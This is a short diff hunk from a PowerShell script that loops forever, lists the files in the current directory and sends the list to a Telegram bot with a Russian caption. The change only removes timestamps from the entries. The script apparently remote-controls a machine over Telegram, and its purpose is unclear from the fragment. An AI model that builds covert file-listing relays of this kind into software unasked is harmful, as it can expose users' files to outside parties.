@@ -191,7 +191,7 @@ while ($true) {
                             foreach ($item in $items) {
                                 $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                 $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
-                                $fileList += "$type $($item.Name)$size - $($item.LastWriteTime.ToString('dd.MM.yyyy HH:mm'))"
+                                $fileList += "$type $($item.Name)$size"
                             }
                             Send-Telegram "Содержимое $currentDir
 $($fileList -join "`n")"
